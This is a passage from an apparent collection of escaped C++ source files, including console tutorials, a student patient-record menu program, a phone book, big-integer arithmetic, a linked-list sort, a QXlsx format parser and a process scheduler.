\u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u043d\u0438\u044f \u0435\u0433\u043e\n              //\u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 i \u043e\u043d\u043e \u0431\u0443\u0434\u0435\u0442 \u0438\u043d\u0442\u0440\u043e\u043f\u0440\u0435\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u043a\u0430\u043a \u043e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\n\n     cout << i << \" \" << j << endl; //\u0432\u044b\u0432\u043e\u0434 \u0432 \u043a\u043e\u043d\u0441\u043e\u043b\u044c -5536 60000\n  \n     char ch;\n     ch = 'X'; //  \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0439 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 char \u043f\u0440\u0438\u0441\u0432\u043e\u0438\u043b\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \" X \"\n     cout << \" \\t This is char ch = \" << ch << endl; //\u0412\u044b\u0432\u043e\u0434 :  This is char ch = \u0425\n\n     cout << \"\\tThe program outputs the Latin alphabet\" << endl;\n     cout << \"\\n\";\n     char letter;\n     for (letter = 'A'; letter <= 'Z'; letter++)    //\u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0442\u0438\u043f\u0430 char \u0434\u043b\u044f \n         cout <<     letter << \" \";                 //\u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0446\u0438\u043a\u043b\u043e\u043c for\n\n    system(\"pause>0\");\n}",
    "\n#include<iostream>\n#include<fstream>\n#include<cstdlib>\n#include<conio.h>\n#include<time.h>\n#include<iomanip>\n\nusing namespace std;\nint main()\n\n//NOTE: RUN THE PROGRAM IN FULL SCREEN ONLY\n\n{\nchar fname[20];\ntime_t rawtime;\nstruct tm * timeinfo;\n\ntime ( &rawtime );\ntimeinfo = localtime ( &rawtime );\n\n//printing the welcome note\nre:\ncout<<\"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t\\t\\t\\t\\t\\n\";\ncout<<\"\\t\\t\\t\\t\\t _______________________________________________________________________________________\\n\";\ncout<<\"\\t\\t\\t\\t\\t                                           \t\t                                       \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                           \t\t                                       \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                           \t\t                                       \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                           \t\t                                       \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                           \t\t                                       \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                           \t\t                                       \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                  WELCOME TO                                              \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                                                                          \\n\";\ncout<<\"\\t\\t\\t\\t\\t                         MEDICAL DIAGNOSTIC MANAGEMENT SYSTEM                                     \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                                                                          \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                                                                          \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                                                                          \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                                                                          \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                                                                          \\n\";\ncout<<\"\\t\\t\\t\\t\\t                                                 -POOJA LP AND POOJITHA YADAV M           \\n\";\ncout<<\"\\t\\t\\t\\t\\t _______________________________________________________________________________________\\n\";\ncout<<\"\\t\\t\\t\\t\\t                                                                                            \\n\\n\\n\\n\\t\\t\\t\\t\\t\";\nsystem(\"pause\");\nsystem(\"cls\");\n\n\n\nint i;\nint login();\nlogin();\n//giving option to the user for their choice\nb:\ncout<<\"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t  MEDICAL DIAGNOSTIC MANAGEMENT SYSTEM \\n\\n\";\ncout<<\"\\n\\n\\t\\t\\t\\t\\t\\tPlease,  Choose from the following Options: \\n\\n\";\ncout<<\"\\t\\t\\t\\t\\t\\t _________________________________________________________________ \\n\";\ncout<<\"\\t\\t\\t\\t\\t\\t|                                           \t                  |\\n\";\ncout<<\"\\t\\t\\t\\t\\t\\t|             1  >> Add New Patient Record                        |\\n\";\ncout<<\"\\t\\t\\t\\t\\t\\t|             2  >> Add Diagnosis Information                     |\\n\";\ncout<<\"\\t\\t\\t\\t\\t\\t|             3  >> Full History of the Patient                   |\\n\";\ncout<<\"\\t\\t\\t\\t\\t\\t|             4  >> Exit the Program                              |\\n\";\ncout<<\"\\t\\t\\t\\t\\t\\t|_________________________________________________________________|\\n\\n\";\na:cout<<\"\\t\\t\\t\\t\\t\\tEnter your choice: \";cin>>i;\nif(i>4||i<1){cout<<\"\\n\\n\\t\\t\\t\\t\\t\\tInvalid Choice\\n\";cout<<\"\\t\\t\\t\\t\\t\\tTry again...........\\n\\n\";goto a;} //if inputed choice is other than given choice\n\n\n\nsystem(\"cls\");\n\n\n\n\n//Adding the record of the new patient..................option 3\nif(i==1)\n{\n  time_t rawtime;\n  struct tm * timeinfo;\n\n  time ( &rawtime );\n  timeinfo = localtime ( &rawtime );\n  cout<<\"\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\"<< asctime (timeinfo);\n  ofstream pat_file;\n  char fname[20];\n  cout<<\"\\n\\n\\n\\nEnter the patient's file name : \";\n  cin.ignore();\n  gets(fname);\n  pat_file.open(fname);\n  \t\tif(!fname)\n\t\t{\n\t\tcout<<\"\\nError while opening the file\\n\";goto b;\n\t\t}\n\t\telse\n\t\t{\n                        struct patient_info\n                        {\n                            char name[20];\n                            char address[100];\n                            char contact[10];\n                            char age[5];\n                            char sex[8];\n                            char blood_gp[5];\n                            char disease_past[50];\n                            char id[15];\n                        };\n\n            patient_info ak;\n            cout<<\"\\n********************************************************************\\n\";pat_file<<\"\\n********************************************************************\\n\\n\";//fn1353 st\n            cout<<\"\\nName : \";pat_file<<\"Name : \";gets(ak.name);pat_file<<ak.name<<\"\\n\";\n            cout<<\"\\nAddress : \";pat_file<<\"Address : \";gets(ak.address);pat_file<<ak.address<<\"\\n\";\n            cout<<\"\\nContact Number : \";pat_file<<\"Contact Number : \";gets(ak.contact);pat_file<<ak.contact<<\"\\n\";\n            cout<<\"\\nAge ",
    "#include <bits/stdc++.h>\nusing namespace std;\nclass DLLNode {\n  public:\n    int data;\n    DLLNode *next;\n    DLLNode *prev;\n\n    DLLNode(int val) {\n        data = val;\n        this->next = NULL;\n        this->prev = NULL;\n    }\n};\nstruct compare {\n    bool operator()(DLLNode* a, DLLNode* b) {\n        return a->data > b->data;\n    }\n};\nclass Solution {\npublic:\n    DLLNode *sortAKSortedDLL(DLLNode *head, int k) {\n        if (head == NULL) return head;\n        priority_queue<DLLNode*, vector<DLLNode*>, compare> minHeap;\n        DLLNode *newHead = NULL, *last = NULL;\n        for (int i = 0; head && i <= k; i++) {\n            minHeap.push(head);\n            head = head->next;\n        }\n        while (!minHeap.empty()) {\n            DLLNode *minNode = minHeap.top();\n            minHeap.pop();\n            if (newHead == NULL) {\n                newHead = minNode;\n                newHead->prev = NULL;\n                last = newHead;\n            } else {\n                last->next = minNode;\n                minNode->prev = last;\n                last = minNode;\n            }\n            if (head) {\n                minHeap.push(head);\n                head = head->next;\n            }\n        }\n        last->next = NULL;\n\n        return newHead;\n    }\n};\nvoid push(DLLNode **tailRef, int new_data) {\n    DLLNode *newNode = new DLLNode(new_data);\n    newNode->next = NULL;\n\n    newNode->prev = (*tailRef);\n    if ((*tailRef) != NULL)\n        (*tailRef)->next = newNode;\n\n    (*tailRef) = newNode;\n}\nvoid printList(DLLNode *head) {\n    if (head == NULL)\n        return;\n\n    while (head != NULL) {\n        cout << head->data << \" \";\n        head = head->next;\n    }\n}\nint main() {\n    int t;\n    cin >> t;\n    cin.ignore();\n    while (t--) {\n        vector<int> arr;\n        string input;\n        getline(cin, input);\n        stringstream ss(input);\n        int number;\n        while (ss >> number) {\n            arr.push_back(number);\n        }\n\n        int k;\n        cin >> k;\n        cin.ignore();\n\n        DLLNode *head = new DLLNode(arr[0]);\n        DLLNode *tail = head;\n        for (size_t i = 1; i < arr.size(); ++i) {\n            push(&tail, arr[i]);\n        }\n        Solution obj;\n        printList(obj.sortAKSortedDLL(head, k));\n        cout << \"\\n\";\n    }\n\n    return 0;\n}",
    "#include <iostream>\n#include <algorithm>\n#include <string>\n#include <vector>\nusing namespace std;\n\n//\u4ee5\u4e0b\u8f93\u5165\u662f\u5012\u5e8f\u8f93\u5165\uff0c\u8f93\u5165\u7684\u4e2a\u4f4d\u5728\u524d\u9762\n//\u51fd\u6570\u6ca1\u6709reverse\u7684\u8f93\u51fa\u662f\u5012\u5e8f\uff0c\u9664\u6cd5\u9664\u5916\nbool cmp_sub_vector(const vector<int> &A,const vector<int> &B){\n    if (A.size()!=B.size()) return A.size()>B.size();\n    for (int i = A.size()-1; i >= 0; --i)\n        if (A[i]!=B[i]) return A[i]>B[i];\n    return true;\n}\n\nvector<int> sub(const vector<int> &A,const vector<int> &B){\n    vector<int> result;\n    int temp=0;\n    for (int i = 0; i < A.size(); ++i) {\n        temp= A[i] - temp;\n        if (i<B.size()) temp -= B[i];\n        result.push_back((temp + 10) % 10);\n        if (temp < 0) temp=1;\n        else temp=0;\n    }\n    while (result.size()>1 && result.back()==0) result.pop_back();\n//    reverse(result.begin(),result.end());\n    return result;\n}\n\nvector<int> add(const vector<int> &A,const vector<int> &B){\n    vector<int> result;\n    int carry=0,i=0,j=0;\n    while (i<A.size() || j<B.size() || carry){\n        if (i<A.size()) carry+=A[i++];\n        if (j<B.size()) carry+=B[j++];\n        result.push_back(carry%10);\n        carry/=10;\n    }\n    reverse(result.begin(),result.end());\n    return result;\n}\n\nvector<int> multi_1(const vector<int> &A,const int &b){\n    vector<int> result;\n    int carry=0,i=0;\n    while (i<A.size() || carry){\n        if (i<A.size()) carry+=A[i++]*b;\n        result.push_back(carry%10);\n        carry/=10;\n    }\n    reverse(result.begin(),result.end());\n    return result;\n}\n\nvector<int> multi_2(const vector<int> &A,const vector<int> &B){\n    vector<int> result(A.size()+B.size(),0);\n    for (int i = 0; i < A.size(); ++i) {\n        for (int j = 0; j < B.size(); ++j) {\n            result[i+j]+=A[i]*B[j];\n            result[i+j+1]+=result[i+j]/10;\n            result[i+j]%=10;\n        }\n    }\n    while (result.size()>1 && result.back()==0) result.pop_back();\n    reverse(result.begin(),result.end());\n    return result;\n}\n\nvector<int> div_1(const vector<int> &A,const int &b,int &r){\n    vector<int> result;\n    r=0;\n    for (int i=A.size()-1; i>=0; --i) {\n        r=r*10+A[i];\n        result.push_back(r/b);\n        r%=b;\n    }\n    while (result.size()>1 && result.front()==0) result.erase(result.begin());\n    return result;\n}\n\nint main(){\n    string a,b;\n    vector<int> A,B,result;\n    cin>>a>>b;\n    for (int i=a.size()-1;i>=0;--i) A.push_back(a[i]-'0');\n    for (int i=b.size()-1;i>=0;--i) B.push_back(b[i]-'0');\n\n//    add\n//    result=add(A,B);\n\n//    sub\n//    bool c= cmp_sub_vector(A,B);\n//    cout<<c<<endl;\n//    if (cmp_sub_vector(A,B)) {\n//        result= sub(A,B);\n//    }else{\n//        result= sub(B,A);\n//        cout<<\"-\";\n//    }\n\n//    multiply_Big*Int\n//    int a_1;\n//    cin>>a_1;\n//    result= multi_1(A,a_1);\n\n//    multiply_Big*Big\n//    result= multi_2(A,B);\n\n//    div_Big/Int\n//    int r;//r\u662f\u4f59\u6570\n\n    for (int it:result) cout<<it;\n    cout<<endl;\n    return 0;\n}\n",
    "\ufeff#include <iostream>\n#include <cstdlib>\n#include <windows.h>\n#pragma comment(lib, \"winmm.lib\")\n\n\n\nusing namespace std;\n\nvoid Menu();\nvoid MenuSub1();\nvoid MenuSub2();\nvoid MenuSub3();\nint Find(string key, string arr[], int size);\n\nint main()\n{\n\t \n\tSetConsoleTitle(TEXT(\"\u0422\u0435\u043b\u0435\u0444\u043e\u043d\u043d\u0430\u044f \u043a\u043d\u0438\u0433\u0430\")); \n\t\n\n\tsystem(\"color 02\");\n\tsetlocale(LC_ALL, \"RU\");\n\n\t{\n\t\tconst wchar_t* path = L\"C:\\\\Users\\\\User\\\\Desktop\\\\polskaya-korova.wav\";\n\n\t\tPlaySound(path, NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);\n\n\t}\n\n\tcout << \"\\n\";\n\tcout << \"\\t\\t \u0422\u0415\u041b\u0415\u0424\u041e\u041d\u041d\u0410\u042f \u041a\u041d\u0418\u0413\u0410\" << \"\\n\"; cout << \"\\n\";\n\n\tchar yesNo;\n\n\tconst int SIZE = 10;\n\tstring names[SIZE]{ \"Ilona\", \"Eugene\", \"Alina\",\"0\",\"0\",\"0\",\"0\",\"0\",\"0\",\"0\" };\n\tstring tel[SIZE]{ \"380971234567\", \"3809612345667\", \"380501234567\",\"0\",\"0\",\"0\",\"0\",\"0\",\"0\",\"0\" };\n\tstring find, name, phone;\n\tint count, index, choice, choiceMenu, choiceSubMenu1, choiceSubMen2, choiceSubMen3;;\n\n\tdo\n\t{\n\t\tyesNo = 'N';\n\n\t\tMenu(); // \u0432\u044b\u0432\u043e\u0434 \u043c\u0435\u043d\u044e 1) c\u043f\u0438\u0441\u043e\u043a \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u043e\u0432 | 2) \u043f\u043e\u0438\u0441\u043a \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u043e\u0432 | 3) \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043a\u043e\u043d\u0442\u0430\u043a\u0442\t\n\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u043c\u0435\u043d\u044e: \"; cin >> choiceMenu; cout << \"\\n\";\n\n\t\tif (choiceMenu == 1) //\u043c\u0435\u043d\u044e \u0432\u044b\u0431\u043e\u0440\u0430 1\n\t\t{\n\t\t\tMenuSub1();\n\n\t\t\tif (names[0].size() > 1 && tel[0].size() > 1)\n\t\t\t{\n\t\t\t\tfor (int i = 0; i < SIZE; i++)\n\t\t\t\t{\n\t\t\t\t\tif (names[i].size() > 1 && tel[i].size() > 1)\n\t\t\t\t\t{\n\t\t\t\t\t\tcount = i + 1;\n\t\t\t\t\t\tcout << count << \") \" << \"\u0418\u043c\u044f: \" << names[i] << \" \u0422\u0435\u043b\u0435\u0444\u043e\u043d: \" << tel[i]; cout << \"\\n\";\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"\\n\";\n\t\t\t\tcout << \"C\u043f\u0438\u0441\u043e\u043a \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u043e\u0432 \u043f\u0443\u0441\u0442. \u041d\u0435\u043e\u0445\u043e\u0434\u0438\u043c\u043e \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u044b.\" << \"\\n\";\n\t\t\t\tcout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043b\u0438 \u0432\u044b \u0432\u044b\u0439\u0442\u0438 \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e?\" << \" \u0412\u0432\u0435\u0434\u0438\u0442\u0435 'Y' \u0438\u043b\u0438 'N'\" << \"\\n\"; cin >> yesNo;\n\t\t\t}\n\n\t\t}\n\t\telse if (choiceMenu == 2) //\u043c\u0435\u043d\u044e \u0432\u044b\u0431\u043e\u0440\u0430 2\n\t\t{\n\t\t\tMenuSub2();\n\n\t\t\tcout << \"\u0412\u0430\u0440\u0438\u0430\u043d\u0442 1: \u0412\u0432\u0435\u0434\u0438\u0442\u0435 1 \u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u043f\u043e\u0438\u0441\u043a \u043f\u043e \u0438\u043c\u0435\u043d\u0438\"; cout << \"\\n\";\n\t\t\tcout << \"\u0412\u0430\u0440\u0438\u0430\u043d\u0442 2: \u0412\u0432\u0435\u0434\u0438\u0442\u0435 2 \u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u043f\u043e\u0438\u0441\u043a \u043f\u043e \u043d\u043e\u043c\u0435\u0440\u0443\"; cout << \"\\n\";\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0440\u0438\u0430\u043d\u0442: \"; cin >> choice;\n\n\t\t\tif (choice == 1)\n\t\t\t{\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f: \"; cin >> find;\n\t\t\t\tindex = Find(find, names, SIZE);\n\n\t\t\t\tif (index == -1)\n\t\t\t\t{\n\t\t\t\t\tcout << \"\\n\";\n\t\t\t\t\tcout << \"\u0422\u0430\u043a\u043e\u0433\u043e \u0438\u043c\u0435\u043d\u0438 \u043d\u0435\u0442!\"; cout << \"\\n\"; cout << \"\\n\";\n\t\t\t\t\tcout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043b\u0438 \u0432\u044b \u0432\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e?\" << \" \u0412\u0432\u0435\u0434\u0438\u0442\u0435 'Y' \u0438\u043b\u0438 'N'\" << \"\\n\"; cin >> yesNo;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcout << \"\\n\";\n\t\t\t\t\tcout << names[index] << \" : \" << tel[index]; cout << \"\\n\"; cout << \"\\n\";\n\t\t\t\t\tcout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043b\u0438 \u0432\u044b \u0432\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e?\" << \" \u0412\u0432\u0435\u0434\u0438\u0442\u0435 'Y' \u0438\u043b\u0438 'N'\" << \"\\n\"; cin >> yesNo;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (choice == 2)\n\t\t\t{\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440: \"; cin >> find;\n\t\t\t\tindex = Find(find, tel, SIZE);\n\n\t\t\t\tif (index == -1)\n\t\t\t\t{\n\t\t\t\t\tcout << \"\\n\";\n\t\t\t\t\tcout << \"\u0422\u0430\u043a\u043e\u0433\u043e \u043d\u043e\u043c\u0435\u0440\u0430 \u043d\u0435\u0442!\"; cout << \"\\n\"; cout << \"\\n\";\n\t\t\t\t\tcout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043b\u0438 \u0432\u044b \u0432\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e?\" << \" \u0412\u0432\u0435\u0434\u0438\u0442\u0435 'Y' \u0438\u043b\u0438 'N'\" << \"\\n\"; cin >> yesNo;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcout << \"\\n\";\n\t\t\t\t\tcout << names[index] << \" : \" << tel[index]; cout << \"\\n\"; cout << \"\\n\";\n\t\t\t\t\tcout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043b\u0438 \u0432\u044b \u0432\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e?\" << \" \u0412\u0432\u0435\u0434\u0438\u0442\u0435 'Y' \u0438\u043b\u0438 'N'\" << \"\\n\"; cin >> yesNo;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"\\n\";\n\t\t\t\tcout << \"\u0422\u0430\u043a\u043e\u0433\u043e \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u0430 \u043d\u0435\u0442!\" << \"\\n\"; cout << \"\\n\";\n\t\t\t\tcout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043b\u0438 \u0432\u044b \u0432\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e?\" << \" \u0412\u0432\u0435\u0434\u0438\u0442\u0435 'Y' \u0438\u043b\u0438 'N'\" << \"\\n\"; cin >> yesNo;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\t\telse if (choiceMenu == 3) //\u043c\u0435\u043d\u044e \u0432\u044b\u0431\u043e\u0440\u0430 3\n\t\t{\n\t\t\tdo\n\t\t\t{\n\t\t\t\tMenuSub3();\n\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f: \"; cin >> name;\n\n\t\t\t\tfor (int i = 0; i < SIZE; i++)\n\t\t\t\t{\n\t\t\t\t\tif (names[i].size() == 1)\n\t\t\t\t\t{\n\t\t\t\t\t\tnames[i] = name;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0442\u0435\u043b\u0435\u0444\u043e\u043d: \"; cin >> phone;\n\n\t\t\t\tfor (int i = 0; i < SIZE; i++)\n\t\t\t\t{\n\t\t\t\t\tif (tel[i].size() == 1)\n\t\t\t\t\t{\n\t\t\t\t\t\ttel[i] = phone;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tcout << \"\\n\";\n\t\t\t\tcout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043b\u0438 \u0432\u044b \u0435\u0449\u0435 \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043a\u043e\u043d\u0442\u0430\u043a\u0442?\" << \" \u0412\u0432\u0435\u0434\u0438\u0442\u0435 'Y' \u0438\u043b\u0438 'N'\" << \"\\n\"; cin >> yesNo;\n\n\t\t\t} while (yesNo == 'Y' || yesNo == 'y');\n\t\t}\n\n\t\tcout << \"\\n\";\n\t\tcout << \"\u0425\u043e\u0442\u0438\u0442\u0435 \u043b\u0438 \u0432\u044b \u0432\u0435\u0440\u043d\u0443\u0442\u044c\u0441\u044f \u0432 \u0433\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e?\" << \" \u0412\u0432\u0435\u0434\u0438\u0442\u0435 'Y' \u0438\u043b\u0438 'N'\" << \"\\n\"; cin >> yesNo;\n\n\t} while (yesNo == 'Y' || yesNo == 'y');\n\n\tsystem(\"pause\");\n}\n\nvoid Menu() //\u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0432\u044b\u0432\u043e\u0434\u0430 \u043c\u0435\u043d\u044e\n{\n\tfor (int i = 0; i < 18; i++)\n\t{\n\t\tcout << \" __ \";\n\t}\n\n\tcout << \"\\n\";\n\tcout << \"\\n\";\n\tcout << \"|  1) \u0421\u041f\u0418\u0421\u041e\u041a \u041a\u041e\u041d\u0422\u0410\u041a\u0422\u041e\u0412  |  2) \u041f\u041e\u0418\u0421\u041a \u041a\u041e\u041d\u0422\u0410\u041a\u0422\u041e\u0412  |  3) \u0414\u041e\u0411\u0410\u0412\u0418\u0422\u042c \u041a\u041e\u041d\u0422\u0410\u041a\u0422  |\" << \"\\n\";\n\n\tfor (int i = 0; i < 18; i++)\n\t{\n\t\tcout << \" __ \";\n\t}\n\tcout << \"\\n\"; cout << \"\\n\";\n}\n\nvoid MenuSub1() // \u043c\u0435\u043d\u044e 1\n{\n\tfor (int i = 0; i < 6; i++)\n\t{\n\t\tcout << \" __ \";\n\t}\n\n\tcout << \"\\n\";\n\tcout << \"\\n\";\n\tcout << \"| 1) \u0421\u041f\u0418\u0421\u041e\u041a \u041a\u041e\u041d\u0422\u0410\u041a\u0422\u041e\u0412  |\" << \"\\n\";\n\n\tfor (int i = 0; i < 6; i++)\n\t{\n\t\tcout << \" __ \";\n\t}\n\tcout << \"\\n\"; cout << \"\\n\"; cout << \"\\n\";\n}\n\nvoid MenuSub2() // \u043c\u0435\u043d\u044e 2\n{\n\tfor (int i = 0; i < 6; i++)\n\t{\n\t\tcout << \" __ \";\n\t}\n\n\tcout << \"\\n\";\n\tcout << \"\\n\";\n\tcout << \"| 2) \u041f\u041e\u0418\u0421\u041a \u041a\u041e\u041d\u0422\u0410\u041a\u0422\u041e\u0412  |\" << \"\\n\";\n\n\tfor (int i = 0; i < 6; i++)\n\t{\n\t\tcout << \" __ \";\n\t}\n\tcout << \"\\n\"; cout << \"\\n\"; cout << \"\\n\";\n}\n\nvoid MenuSub3() // \u043c\u0435\u043d\u044e 3\n{\n\tfor (int i = 0; i < 6; i++)\n\t{\n\t\tcout << \" __ \";\n\t}\n\n\tcout << \"\\n\";\n\tcout << \"\\n\";\n\tcout << \"| 3) \u0414\u041e\u0411\u0410\u0412\u0418\u0422\u042c \u041a\u041e\u041d\u0422\u0410\u041a\u0422  |\" << \"\\n\";\n\n\tfor",
    "// xlsxnumformatparser.cpp\n\n#include \"xlsxnumformatparser_p.h\"\n\n#include <QString>\n#include <QtGlobal>\n\nQT_BEGIN_NAMESPACE_XLSX\n\nbool NumFormatParser::isDateTime(const QString &formatCode)\n{\n    for (int i = 0; i < formatCode.length(); ++i) {\n        const QChar &c = formatCode[i];\n\n        switch (c.unicode()) {\n        case '[':\n            // [h], [m], [s] are valid format for time\n            if (i < formatCode.length() - 2 && formatCode[i + 2] == QLatin1Char(']')) {\n                const QChar cc = formatCode[i + 1].toLower();\n                if (cc == QLatin1Char('h') || cc == QLatin1Char('m') || cc == QLatin1Char('s'))\n                    return true;\n                i += 2;\n                break;\n            } else {\n                // condition or color: don't care, ignore\n                while (i < formatCode.length() && formatCode[i] != QLatin1Char(']'))\n                    ++i;\n                break;\n            }\n\n        // quoted plain text block: don't care, ignore\n        case '\"':\n            while (i < formatCode.length() - 1 && formatCode[++i] != QLatin1Char('\"'))\n                ;\n            break;\n\n        // escaped char: don't care, ignore\n        case '\\\\':\n            if (i < formatCode.length() - 1)\n                ++i;\n            break;\n\n        // date/time can only be positive number,\n        // so only the first section of the format make sense.\n        case '#': // this is new an working // https://github.com/QtExcel/QXlsx/issues/190\n        case ';':\n            return false;\n            break;\n\n        // days\n        case 'D':\n        case 'd':\n        // years\n        case 'Y':\n        case 'y':\n        // hours\n        case 'H':\n        case 'h':\n        // seconds\n        case 'S':\n        case 's':\n        // minutes or months, depending on context\n        case 'M':\n        case 'm':\n            return true;\n\n        default:\n            break;\n        }\n    }\n    return false;\n}\n\nQT_END_NAMESPACE_XLSX\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <queue>\n#include <string>\n#include <sstream>\n\nusing namespace std;\n\n// Estructura de proceso\nstruct Process {\n    string id;\n    int burst_time;\n    int arrival_time;\n    int queue_level;\n    int priority;\n    int wait_time;\n    int completion_time;\n    int response_time;\n    int turnaround_time;\n    int remaining_time;\n};\n\n// Funci\u00f3n para leer procesos desde un archivo\nvector<Process> readProcessesFromFile(const string& filename) {\n    vector<Process> processes;\n    ifstream file(filename);\n    string line;\n    \n    while (getline(file, line)) {\n        if (line[0] == '#') continue; // Saltar comentarios\n        \n        stringstream ss(line);\n        string id;\n        int burst_time, arrival_time, queue_level, priority;\n        char delimiter;\n        \n        getline(ss, id, ';');\n        ss >> burst_time >> delimiter >> arrival_time >> delimiter >> queue_level >> delimiter >> priority;\n        \n        Process process = {id, burst_time, arrival_time, queue_level, priority, 0, 0, -1, 0, burst_time};\n        processes.push_back(process);\n    }\n    \n    return processes;\n}\n\n// Round Robin Scheduler con Quantum\nvoid round_robin(vector<Process>& processes, int quantum, int& current_time) {\n    queue<Process*> rr_queue;\n    for (auto& process : processes) {\n        if (process.arrival_time <= current_time && process.remaining_time > 0) {\n            rr_queue.push(&process);\n        }\n    }\n    \n    while (!rr_queue.empty()) {\n        Process* process = rr_queue.front();\n        rr_queue.pop();\n\t\n\tif (process->response_time == -1) {\n            process->response_time = current_time - process->arrival_time;\n        }\n        \n        if (process->remaining_time <= quantum) {\n            current_time += process->remaining_time;\n            process->completion_time = current_time;\n            process->remaining_time = 0;\n        } else {\n            current_time += quantum;\n            process->remaining_time -= quantum;\n            // Volver a encolar el proceso si no ha terminado\n            rr_queue.push(process);\n        }\n        \n        // Actualizar m\u00e9tricas\n        process->turnaround_time = process->completion_time - process->arrival_time;\n        process->wait_time = process->turnaround_time - process->burst_time;\n    }\n}\n\n// First Come First Served (FCFS) Scheduler\nvoid fcfs(vector<Process>& processes, int& current_time) {\n    for (auto& process : processes) {\n        if (process.arrival_time <= current_time && process.remaining_time > 0) {\n\t    if (process.response_time == -1) {\n                process.response_time = current_time - process.arrival_time;\n            }\n\n            current_time += process.remaining_time;\n            process.completion_time = current_time;\n            process.remaining_time = 0;\n            \n            // Actualizar m\u00e9tricas\n            process.turnaround_time = process.completion_time - process.arrival_time;\n            process.wait_time = process.turnaround_time - process.burst_time;\n        }\n    }\n}\n\n// Funci\u00f3n para dividir los procesos en sus respectivas colas\nvoid processQueues(vector<Process>& processes) {\n    vector<Process> queue1, queue2, queue3;\n    \n    // Clasificar los procesos por cola\n    for (auto& process : processes) {\n        if (process.queue_level == 1)\n            